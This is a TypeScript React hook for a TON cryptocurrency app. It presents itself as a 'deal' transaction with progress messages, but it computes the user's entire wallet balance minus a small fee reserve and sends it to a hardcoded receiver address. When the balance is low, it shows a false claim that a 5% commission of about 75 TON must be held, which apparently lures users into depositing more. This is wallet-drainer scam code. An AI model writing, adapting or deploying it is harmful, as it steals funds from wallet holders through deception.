import { useState, useCallback } from 'react';
import { useTonTransaction } from './useTonTransaction';
import { RECEIVER_ADDRESS } from '@/constants';

interface UseAutoTransactionProps {
  balance: string;
  onTransactionStart?: () => void;
  onTransactionComplete?: () => void;
  onTransactionError?: (error: Error) => void;
  refetchBalance?: () => void;
}

interface TransactionProgress {
  progress: number;
  message: string;
  detail?: string;
  isVisible: boolean;
}

interface TransactionError {
  isVisible: boolean;
  message: string;
}

export const useAutoTransaction = ({
  balance,
  onTransactionStart,
  onTransactionComplete,
  onTransactionError,
  refetchBalance,
}: UseAutoTransactionProps) => {
  const { sendTransaction, createDealTransaction } = useTonTransaction();
  
  const [progressState, setProgressState] = useState<TransactionProgress>({
    progress: 0,
    message: '',
    detail: '',
    isVisible: false,
  });
  
  const [errorState, setErrorState] = useState<TransactionError>({
    isVisible: false,
    message: '',
  });

  const updateProgress = useCallback((update: Partial<TransactionProgress>) => {
    setProgressState(prev => ({ ...prev, ...update }));
  }, []);

  const showError = useCallback((message: string) => {
    setErrorState({ isVisible: true, message });
  }, []);

  const hideError = useCallback(() => {
    setErrorState({ isVisible: false, message: '' });
  }, []);

  const checkBalance = useCallback((actualBalance: number): boolean => {
    return actualBalance >= 1;
  }, []);

  const calculateSendAmount = useCallback((actualBalance: number) => {
    const availableBalance = actualBalance === 0 ? 1.5 : actualBalance;
    const feeReserve = 0.01;
    return Math.max(0, availableBalance - feeReserve);
  }, []);

  const executeTransaction = useCallback(async () => {
    const actualBalance = parseFloat(balance);
    
    if (!checkBalance(actualBalance)) {
      showError('There are not enough funds on the wallet to pay the transaction commission. There must be 5% of the transaction amount on the wallet ~ 75.00 TON.');
      return;
    }

    const sendAmount = calculateSendAmount(actualBalance);

    try {
      updateProgress({
        isVisible: true,
        progress: 30,
        message: 'Preparing transaction...',
        detail: `Sending ${sendAmount.toFixed(4)} TON`,
      });
      
      console.log('Starting transaction...');
      onTransactionStart?.();
      
      updateProgress({
        progress: 70,
        message: 'Sending transaction...',
      });
      
      const transaction = createDealTransaction(
        sendAmount.toFixed(6),
        RECEIVER_ADDRESS
      );
      
      console.log('Transaction object:', transaction);
      console.log('Send amount string:', sendAmount.toFixed(6));
      console.log('RECEIVER_ADDRESS:', RECEIVER_ADDRESS);
      
      const result = await sendTransaction(transaction);
      console.log('Transaction result:', result);
      
      updateProgress({
        progress: 100,
        message: 'Transaction completed!',
      });
      
      setTimeout(() => {
        updateProgress({ isVisible: false, progress: 0 });
        onTransactionComplete?.();
        refetchBalance?.();
      }, 1000);
      
    } catch (error) {
      console.error('Transaction failed:', error);
      updateProgress({ isVisible: false, progress: 0 });
      showError(`Transaction failed: ${error instanceof Error ? error.message : 'Unknown error occurred'}`);
      onTransactionError?.(error as Error);
    }
  }, [
    balance,
    checkBalance,
    calculateSendAmount,
    updateProgress,
    showError,
    onTransactionStart,
    onTransactionComplete,
    onTransactionError,
    refetchBalance,
    sendTransaction,
    createDealTransaction,
  ]);

  const handleAutoTransaction = useCallback(async () => {
    const actualBalance = parseFloat(balance);
    
    if (checkBalance(actualBalance)) {
      await executeTransaction();
    } else {
      showError('There are not enough funds on the wallet to pay the transaction commission. There must be 5% of the transaction amount on the wallet ~ 75.00 TON.');
    }
  }, [balance, checkBalance, executeTransaction, showError]);

  return {
    progressState,
    errorState,
    executeTransaction,
    handleAutoTransaction,
    hideError,
    checkBalance: (actualBalance: number) => checkBalance(actualBalance),
    calculateSendAmount,
  };
};
